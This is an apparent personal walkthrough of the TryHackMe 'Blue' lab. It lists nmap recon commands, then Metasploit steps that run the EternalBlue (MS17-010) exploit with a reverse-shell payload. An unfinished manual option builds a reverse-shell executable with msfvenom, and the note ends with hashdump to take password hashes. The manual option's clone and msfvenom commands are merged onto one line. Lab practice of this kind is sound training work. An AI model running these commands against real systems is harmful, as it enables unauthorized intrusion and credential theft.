# Blue

**Room Link:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)

## **Walkthrough**

### **Recon**

`nmap -A 10.10.68.22`

``<img src="../../.gitbook/assets/image (1).png" alt="" data-size="original">``

The box is vulnerable to ms17-010

`nmap -p135,139,445,3389 --script=vuln 10.10.68.22`

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Gain Access / Escalate

#### Option #1 - Metasploit

`msfconsole`&#x20;

`search eternalblue`&#x20;

`use exploit/windows/smb/ms17_010_eternalblue`&#x20;

`set payload windows/x64/meterpreter/reverse_tcp`&#x20;

`set RHOSTS 10.10.68.22`&#x20;

`run`

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Option #2 - Manual

Do later

`git clone https://github.com/3ndG4me/AutoBlue-MS17-010 msfvenom -p windows/shell_reverse_tcp -f exe-service lhost=10.10.227.183 lport=443 -o ebevil.exe`

### Cracking

`hashdump`

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



